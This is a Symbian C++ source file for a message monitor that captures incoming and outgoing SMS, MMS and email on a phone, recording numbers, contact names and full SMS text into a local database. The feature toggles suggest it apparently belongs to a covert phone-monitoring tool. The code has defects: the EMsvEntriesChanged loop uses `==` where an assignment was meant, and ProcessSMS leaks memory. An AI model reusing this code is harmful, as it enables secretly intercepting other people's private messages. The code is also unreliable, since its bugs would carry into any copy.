#include "CltMessageMonitor.h"

#include <MsgObserver.rsg>
#include <msvids.h>
	
// Messaging
#include <mtclreg.h> //CClientMtmRegistry
#include <mtclbase.h> //CBaseMtm
#include <SMSCLNT.h> 
#include <SMUTHDR.h>
#include <gsmupdu.h>
#include <miutset.h> // m type
#include <SMTCMTM.h> // Smtp MTM
#include <POPCMTM.H> // Pop3 MTM
#include <mmsclient.h> 

//LogEngine
#include <logcli.h>			// LogEngine
#include <logview.h>
#include <logwrap.h> 
#include <txtrich.h>  //CRichText ; Location: txtrich.h 
#include <mmsconst.h> // MMS type
#include <EIKDEF.h> // 
#include <TXTRICH.h> // 

// Logger
#include "Logger.h"

#include "CltLogEvent.h"
#include "CltEmailMonitor.h"
#include "CltMmsMonitor.h"
#include "CltPredef.h"


//-------------------------------------------
// Construction
//-------------------------------------------	
CCltMessageMonitor::CCltMessageMonitor(CLogClient& aLogCli, CCltDatabase& aLogEventDb)
				:CActive(CActive::EPriorityStandard),
				iLogClient(aLogCli),
				iDb(aLogEventDb)
{	
	iNumberToReIssue = 0;
	iNumOfLogDumped = 0;
	iDbWait = EFalse;
	iIsSessionReady = EFalse;
	
	iEventSMSEnable = EFalse;
	iEventMMSEnable = EFalse;
	iEventMAILEnable = EFalse;
}

CCltMessageMonitor::~CCltMessageMonitor()
{	
	Cancel(); //active object
	delete iMmsMon;
	delete iMsvEntry;
	delete iMtmReg;
	delete iMsvSession;	
	delete iEmailMonitor;
	iEventArray.ResetAndDestroy();
}

CCltMessageMonitor* CCltMessageMonitor::NewL(CLogClient& aLogCli, CCltDatabase& aLogEventDb)
{
	CCltMessageMonitor* self = CCltMessageMonitor::NewLC(aLogCli,aLogEventDb);
	CleanupStack::Pop(self);
	return self;
}

CCltMessageMonitor* CCltMessageMonitor::NewLC(CLogClient& aLogCli, CCltDatabase& aLogEventDb)
{
	CCltMessageMonitor* self = new (ELeave) CCltMessageMonitor(aLogCli,aLogEventDb);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
}


void CCltMessageMonitor::ConstructL()
{	
	iMsvSession = CMsvSession::OpenAsyncL(*this);
	
	CCltSettings& setting = SETTING();		
	setting.AddObserver(this);
				
    //svSession->SetReceiveEntryEvents(ETrue);
}

void CCltMessageMonitor::GetCLogEvent(TInt aLogServerId)
{
	
}	

//-------------------------------------------
// CAtive's implementation
//-------------------------------------------

void CCltMessageMonitor::DoCancel()
{
}

TInt CCltMessageMonitor::RunError(TInt aError)
{
	return KErrNone;
}

void CCltMessageMonitor::RunL()
{
}


void CCltMessageMonitor::OnDbUnlock()
{	
	if(iDbWait)//check if waiting for lock
		AppendToDatabase();
}

//Append LogEvent to database
void CCltMessageMonitor::AppendToDatabase()
{	
	if(Logger::DebugEnable())
		LOG1(_L("[CCltMessageMonitor::AppendToDatabase] Entering: Count: %d"),iEventArray.Count())
		
	if(iEventArray.Count() <= 0) {
		iDbWait = EFalse;
		return;
	}
	
	if(!iDb.AcquireLock()) {
		iDbWait = ETrue;
		return;
	}
	iDbWait = EFalse;
	
	iDb.AppendL(KLogShortMessageEventTypeUid,iEventArray);	
	iEventArray.ResetAndDestroy();
		
	if(Logger::DebugEnable())
		LOG0(_L("[CCltMessageMonitor::AppendToDatabase] End"))
}

// a message entry can have child entry, and sometimes child message is received first.
// in this case have to traverse to get the top most message Id( parent id)
// for fuction is for MMS event only
TMsvId CCltMessageMonitor::GetParentIdOf(TMsvId aEntryId, TMsvId aRootEntry) // rootentry such sas inbox,sent forder..
{	
	if(aEntryId == KMsvRootIndexEntryId)
		return KMsvRootIndexEntryId;
	
	CMsvEntry* msvEntry = iMsvSession->GetEntryL(aEntryId);	
	CleanupStack::PushL(msvEntry);
	
	TMsvEntry entry = msvEntry->Entry();	
	TMsvId paretId = entry.Parent();
	
	CleanupStack::PopAndDestroy(msvEntry);
	
	if(paretId == aRootEntry) { 
		//LOG0(_L("[CCltMessageMonitor::GetParentId] paretId == aRootEntry"))	
		//LOG2(_L("[CCltMessageMonitor::GetParentId] MessageId: %d, ParentId: %d"),aEntryId,paretId)
		return aEntryId;	
	} else {
		//LOG0(_L("[CCltMessageMonitor::GetParentId] paretId != aRootEntry"))
		//LOG2(_L("[CCltMessageMonitor::GetParentId] MessageId: %d, ParentId: %d"),aEntryId,paretId)		
		return GetParentIdOf(paretId,aRootEntry);
	}
}

void CCltMessageMonitor::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* /*aArg3*/)
{
	if(Logger::DebugEnable())
		LOG0(_L("[CCltMessageMonitor::HandleSessionEventL] Entering"))	
	
	// for debuging purpose 
	TRAPD(err,DoHandleSessionEventL(aEvent,aArg1,aArg2,NULL));
	
	if(err) {
		if(Logger::ErrorEnable()) {
			ERR1(_L("[CCltMessageMonitor::HandleSessionEventL] Error: %d"),err)
		}
	}
	
   	if(Logger::DebugEnable()) {
		LOG0(_L("[CCltMessageMonitor::HandleSessionEventL] End"))
	}

}

void CCltMessageMonitor::DoHandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* /*aArg3*/)
{		
	if(Logger::DebugEnable())
		LOG0(_L("[CCltMessageMonitor::DoHandleSessionEventL] Entering"))	
		
	switch (aEvent)
	{	
		case EMsvServerReady:
			if(Logger::DebugEnable())
				LOG0(_L("[CCltMessageMonitor::DoHandleSessionEventL] case EMsvServerReady"))	
	    	
		    iIsSessionReady = ETrue;		    
			// message server is ready to use so its time to create CClientMtmRegistry object
	    	iMtmReg = CClientMtmRegistry::NewL(*iMsvSession);
	    	
	    	//MmmsMonitor
    		iMmsMon = CCltMmsMonitor::NewL(*iMsvSession,*iMtmReg,iLogClient,iDb);
   			iEmailMonitor = CCltEmailMonitor::NewL(*iMsvSession,*iMtmReg,iLogClient,iDb);
	        // Initialise iMsvEntry
	        if (!iMsvEntry)
	            {
	            	iMsvEntry = CMsvEntry::NewL(*iMsvSession, KMsvGlobalInBoxIndexEntryId, TMsvSelectionOrdering());	           	
	            	//svEntry->AddObserverL(*this);
	            }
	        break;
	    case EMsvEntriesCreated:	    	
			{	
				if(Logger::DebugEnable())
					LOG0(_L("[CCltMessageMonitor::DoHandleSessionEventL] case EMsvEntriesCreated"))	
						        
   		   		//TMsvId* msvId = static_cast<TMsvId*>(aArg2);				
		        CMsvEntrySelection* entries = static_cast<CMsvEntrySelection*>(aArg1);
			    iNewMessageId = entries->At(0);			            
			      
		        iMsvEntry->SetEntryL(iNewMessageId);		
				//TMsvEntry entry = iMsvEntry->Entry();  
				if(Logger::DebugEnable())          		
	  				LOG1(_L("[CCltMessageMonitor::DoHandleSessionEventL] case EMsvEntriesCreated: iNewMessageId: %d"), iNewMessageId)
  				
  				// only InboxEntry is interested.
				//if(*msvId != KMsvGlobalInBoxIndexEntryId || !IsTypePOP3(entry) || !IsTypeIMAP4(entry))
				//	return;				
            	//if(IsTypePOP3(entry) || IsTypeIMAP4(entry))
				////	ProcessPOP3(iNewMessageId);
				//ProcessMsvEventL(iNewMessageId,EDirectionIN);	
				//// don't monitoring smtp here, 
				            	 
  			} break;		
		    case EMsvEntriesChanged:// Monitoring Incoming Message here
		    {   
		    	
	    		if(Logger::DebugEnable())
					LOG0(_L("[CCltMessageMonitor::DoHandleSessionEventL] case EMsvEntriesChanged ***"))
						    	
    			TMsvId* msvId = static_cast<TMsvId*>(aArg2);				
		        // look for changes in the Inbox and in mailbox(es)
		        if (*msvId == KMsvGlobalInBoxIndexEntryId || IsMailBoxId(*msvId)) {
						LOG0(_L("[CCltMessageMonitor::DoHandleSessionEventL] EMsvEntriesChanged:EntryId = Inbox"))
										
					CMsvEntrySelection* entries = static_cast<CMsvEntrySelection*>(aArg1);
					TInt entriesCount = entries->Count();
					
					if(Logger::DebugEnable())
						LOG1(_L("[CCltMessageMonitor::DoHandleSessionEventL] CMsvEntrySelection count: %d"),entriesCount)
					
					for(TInt i = 0; i < entriesCount; i++ ) {
						iNewMessageId == entries->At(i);
						if(Logger::DebugEnable())
							LOG1(_L("[CCltMessageMonitor::DoHandleSessionEventL] Incoming Message Detected, iNewMessageId: %d"),iNewMessageId)
							
			         	iMsvEntry->SetEntryL(iNewMessageId);						         	
						//TMsvEntry entry = iMsvEntry->Entry();
						//LOG1(_L("[CCltMessageMonitor::HandleSessionEventL] GetParentId.MessageId: %d"),messageId)	
						ProcessMsvEventL(iNewMessageId,EDirectionIN);						
					}
				}
				
				if(Logger::DebugEnable())
					LOG1(_L("[CCltMessageMonitor::DoHandleSessionEventL] case EMsvEntriesChanged,msvId: %d "),msvId)				
			} break;
			case EMsvEntriesMoved: // Monitoring Outgoing Message here
			{		
				if(Logger::DebugEnable())
					LOG1(_L("[CCltMessageMonitor::DoHandleSessionEventL] case EMsvEntriesMoved:%d"),(TInt)aEvent)
				
    			TMsvId* msvId = static_cast<TMsvId*>(aArg2);
    			
	    		if(Logger::DebugEnable())
					LOG0(_L("[CCltMessageMonitor::DoHandleSessionEventL] case EMsvEntriesMoved:"))
				
				// An entry has been moved to another parent				
				// messages have been moved to Sent folder				
				if (*msvId == KMsvSentEntryId )	{	
					if(Logger::DebugEnable())
						LOG0(_L("[CCltMessageMonitor::DoHandleSessionEventL] case EMsvEntriesMoved:%d, EntryId = Sent Forder"))
						
					CMsvEntrySelection* entries = static_cast<CMsvEntrySelection*>(aArg1);
					TInt entriesCount = entries->Count();
					if(Logger::DebugEnable())
						LOG1(_L("[CCltMessageMonitor::DoHandleSessionEventL] CMsvEntrySelection count: %d"),entriesCount)
					
					for(TInt i = 0; i < entriesCount; i++ ) {
						TMsvId messageId = entries->At(i);					
						
						if(Logger::DebugEnable())
							LOG1(_L("[CCltMessageMonitor::DoHandleSessionEventL] Outgoing Message Detected, iMessageId %d "),messageId)
						
						ProcessMsvEventL(messageId,EDirectionOUT);
						
					}
				}	
			}break;
			case EMsvServerTerminated:
			case EMsvServerFailedToStart:// Something went wrong…
			case EMsvCloseSession://The server is closing. Dispose of any messaging resources.
			{	
				if(Logger::DebugEnable())
					LOG0(_L("[CCltMessageMonitor::DoHandleSessionEventL] case EMsvCloseSession"))	   
			
				delete iMsvSession;
				iMsvSession = NULL;
				iIsSessionReady = EFalse;
			}break;							
	    }
	    
	if(Logger::DebugEnable())
		LOG0(_L("[CCltMessageMonitor::DoHandleSessionEventL] End"))	   
}
    
void CCltMessageMonitor::ProcessSMS(const TMsvId entryId,TMsgDirection aDir)
{		
		
		if(Logger::DebugEnable())
			LOG0(_L("[CCltMessageMonitor::ProcessSMS] Entering"))	
		
		if(IsDuplicateId(entryId)) {
			LOG1(_L("[CCltMessageMonitor::ProcessSMS] Stop!! duplicate Id :%d "),entryId)					
			return;
		}
		
		/*if(iUniqueSmsMsgIdArr.Find(entryId) != KErrNotFound){
			return;
		}*/			
			
		iMsvEntry->SetEntryL(entryId);								
		TMsvEntry entry = iMsvEntry->Entry();					
		
		CSmsClientMtm* smsMtm = STATIC_CAST(CSmsClientMtm*, iMtmReg->NewMtmL(entry.iMtm));		
		CleanupStack::PushL(smsMtm);		
				
		smsMtm->SwitchCurrentEntryL(entryId);		
		smsMtm->RestoreServiceAndSettingsL();
		smsMtm->LoadMessageL();		
		
		CSmsHeader& smsHeader =	smsMtm->SmsHeader();
		
		TPtrC number = smsHeader.FromAddress();// phone number						

		TPtrC contact = entry.iDetails;	 // contact name alias to phonebook
		
		CSmsMessage& msg = smsHeader.Message();
		TPtrC toAndFromAddr = msg.ToFromAddress();		
		
		TPtrC smsContents;
		
		CRichText* richText = NULL;
     	CMsvStore* store = iMsvEntry->ReadStoreL();
        CleanupStack::PushL(store);
	    TInt storeSize =   store->SizeL();
		
        if (store->HasBodyTextL()) {
    		CParaFormatLayer* iParaFormatLayer = CParaFormatLayer::NewL();
			CCharFormatLayer* iCharFormatLayer = CCharFormatLayer::NewL();
			richText = CRichText::NewL(iParaFormatLayer,iCharFormatLayer);
			
			store->RestoreBodyTextL(*richText);
			/*TInt length = richText->DocumentLength();
			TInt wordCound = richText->WordCount();	
			TPtrC richTxtBody = richText->Read(0,360);
			
			LOG3(_L("[CCltMessageMonitor::ProcessSMS] DocumentLength Len :%d, wordCound: %d richTxtBody :%d"),length,wordCound,richTxtBody.Length())
			*/
			smsContents.Set(richText->Read(0));
		}		
				
		CleanupStack::PopAndDestroy(store);
			
		if(Logger::DebugEnable()) {
			const CRichText& smsBody = smsMtm->Body();
			TPtrC smsBodyPtr(smsBody.Read(0));		
			TTime createTime = msg.Time();							
			TBuf<100> dateFormated;			
			createTime.FormatL(dateFormated, _L( "%F%Y/%M/%D %H:%T:%S" ) );				
			LOG1(_L("[CCltMessageMonitor::ProcessSMS] Time :%S "),&dateFormated)		
			LOG1(_L("[CCltMessageMonitor::ProcessSMS] toAndFromMsg :%S"),&toAndFromAddr)
			LOG1(_L("[CCltMessageMonitor::ProcessSMS] storeSize :%d"),storeSize)
			LOG1(_L("[CCltMessageMonitor::ProcessSMS] smsMtm->smsBodyPtr Len :%d"),smsBodyPtr.Length())
			LOG1(_L("[CCltMessageMonitor::ProcessSMS] DocumentLength Len :%d"),smsBody.DocumentLength())
			LOG2(_L("[CCltMessageMonitor::ProcessSMS] SMS,Len: %d, bodys: %S"),smsContents.Length(), &smsContents)
			LOG2(_L("[CCltMessageMonitor::ProcessSMS] Number: %S, Contact: %S"),&number,&contact)
		}
		
		TInt direction = EDirectionOUT;
		
		if(aDir == KCltLogDirIncoming)
			direction = EDirectionIN;
		
		CCltLogEvent* event = CCltLogEvent::NewL( entryId, // messageid
									   entry.iSize,     // Duration field for email size
									   direction, // Direction
									   KCltLogEventTypeSMS, // EventType
									   entry.iDate,	//Time
									   TPtrC(),//Status field: Null
									   TPtrC(),//Description field: Null
									   toAndFromAddr,  //Number field: sender address
									   TPtrC(), //Subject field: null
									   smsContents, //Data field: sms contents
									   contact); //RemoteParty field: contact name
		
		if(richText) {
			delete richText;
			richText = NULL;
		}
		
		iEventArray.Append(event); //event is owned by iLogEventArr
		AppendToDatabase();
		
		CleanupStack::PopAndDestroy(smsMtm);
		
		if(Logger::DebugEnable())
			LOG0(_L("[CCltMessageMonitor::ProcessSMS] End"))		
}

TBool CCltMessageMonitor::IsMailBoxId(const TMsvId aId)
{	
	
	//LOG0(_L("[CCltMessageMonitor::FindServiceL] Entering"))
	// select the root index to start the search
	CMsvEntry* currentEntry = iMsvSession->GetEntryL(KMsvRootIndexEntryId);
	CleanupStack::PushL(currentEntry);
	
	// don't sort the entries
	currentEntry->SetSortTypeL(TMsvSelectionOrdering(KMsvNoGrouping,EMsvSortByNone));	
	
    TInt count=currentEntry->Count();
	// loop for every child entry of the root index
	for(TInt i = 0;i<count;i++)
	{
		const TMsvEntry& child = (*currentEntry)[i];
						
		if (child.iMtm == KUidMsgTypePOP3 || child.iMtm == KUidMsgTypeIMAP4) {
			TMsvId mailBoxId = child.Id();				
			if(aId == mailBoxId) {
				//LOG1(_L("[ CCltMessageMonitor::IsMailBoxId] MailBoxId: %d"),mailBoxId)
				CleanupStack::PopAndDestroy(currentEntry);
				return ETrue;
			}
		}
	}

	CleanupStack::PopAndDestroy(currentEntry);
	return EFalse;
}

void CCltMessageMonitor::ProcessMsvEventL(const TMsvId entryId, TMsgDirection aDir)
{		
	
	iMsvEntry->SetEntryL(entryId);		
	TMsvEntry entry = iMsvEntry->Entry();
	
	if(entry.iMtm == KUidMsgTypeSMS && IsEventSMSEnable()) {
		if(Logger::DebugEnable()) {
			TRAPD(err,ProcessSMS(entryId,aDir));
			if(err) {
				if(Logger::ErrorEnable())
					ERR1(_L("[CCltMessageMonitor::ProcessMsvEventL] ProcessSMS() Leave err: %d"),err)
				User::Leave(err);
			}
		} else
			ProcessSMS(entryId,aDir);
	} else if(entry.iMtm == KUidMsgTypeMultimedia && IsEventMMSEnable()) {
	
		//get the top parent id but not root id
		TMsvId messageId = entryId;		
		if(aDir == EDirectionIN) {
			messageId = GetParentIdOf(entryId,KMsvGlobalInBoxIndexEntryId);
		}
		
		if(Logger::DebugEnable()) {
			TRAPD(err,iMmsMon->ProcessMMSL(messageId, aDir));
			if(err) {
				if(Logger::ErrorEnable())
					ERR1(_L("[CCltMessageMonitor::ProcessMsvEventL] iMmsMon->ProcessMMSL Leave err: %d"),err)
				//User::Leave(err);
			}
		} else //release build
			 iMmsMon->ProcessMMSL(messageId, aDir);
		
	} else if((entry.iMtm == KUidMsgTypePOP3 || entry.iMtm == KUidMsgTypeIMAP4) && aDir == EDirectionIN && IsEventEMAILEnable()) {
		if(Logger::DebugEnable()) {
			TRAPD(err,iEmailMonitor->ProcessPop3L(entryId))
			if(err) {
				if(Logger::ErrorEnable())
					ERR1(_L("[CCltMessageMonitor::ProcessMsvEventL] iEmailMonitor->ProcessPop3L Leave err: %d"),err)
				//User::Leave(err);
			}
		} else
			iEmailMonitor->ProcessPop3L(entryId);
			
	} else if(entry.iMtm == KUidMsgTypeSMTP && aDir == EDirectionOUT && IsEventEMAILEnable()) {
		if(Logger::DebugEnable()) {
			
			TRAPD(err,iEmailMonitor->ProcessSmtpL(entryId))
			if(err) {
				if(Logger::ErrorEnable())
					ERR1(_L("[CCltMessageMonitor::ProcessMsvEventL] iEmailMonitor->ProcessSmtpL Leave err: %d"),err)
				//User::Leave(err);
			}
		} else
			iEmailMonitor->ProcessSmtpL(entryId);
	}	
}

TBool CCltMessageMonitor::IsDuplicateId(const TMsvId anEntryId)
{	
	// this is not the right way to do it
	// @todo: fix it
	TBool result = EFalse;
	if(iUniqueSmsMsgIdArr.Find(anEntryId) != KErrNotFound) {
		result =  ETrue;
	}
	
	if(iUniqueSmsMsgIdArr.Count() == 30 ) {
		iUniqueSmsMsgIdArr.Reset();
	}
	
	iUniqueSmsMsgIdArr.Append(anEntryId);
	
	return result;
}
		
void CCltMessageMonitor::OnSettingChanged(CCltSettings& aSetting)
{	
	if(!aSetting.IsAppEnabled()) {	
		SetEventSMSEnable(EFalse);
		SetEventMMSEnable(EFalse);
		SetEventEMAILEnable(EFalse);
		
		if(Logger::DebugEnable())
			LOG0(_L("[CCltMessageMonitor::OnSettingChanged] App Paused "))	
		
		return;
	}
	
	/*
	if(Logger::DebugEnable()){
		LOG0(_L("[CCltMessageMonitor::OnSettingChanged] Entering"))
		LOG1(_L("[CCltMessageMonitor::OnSettingChanged] IsEventSMSEnable: %d"),IsEventSMSEnable());
		LOG1(_L("[CCltMessageMonitor::OnSettingChanged] IsEventMMSEnable: %d"),IsEventMMSEnable());
		LOG1(_L("[CCltMessageMonitor::OnSettingChanged] IsEventEMAILEnable: %d"),IsEventEMAILEnable());				
	}
	*/
	
	SetEventSMSEnable(aSetting.EventSmsEnable());
	SetEventMMSEnable(aSetting.EventMmsEnable());
	SetEventEMAILEnable(aSetting.EventEmailEnable());
	
	/*
	if(Logger::DebugEnable()){
		LOG0(_L("[CCltMessageMonitor::OnSettingChanged] ----------"))
		LOG1(_L("[CCltMessageMonitor::OnSettingChanged] IsEventSMSEnable: %d"),IsEventSMSEnable());
		LOG1(_L("[CCltMessageMonitor::OnSettingChanged] IsEventMMSEnable: %d"),IsEventMMSEnable());
		LOG1(_L("[CCltMessageMonitor::OnSettingChanged] IsEventEMAILEnable: %d"),IsEventEMAILEnable());				
		LOG0(_L("[CCltMessageMonitor::OnSettingChanged] End"))		
	}
	*/
	
}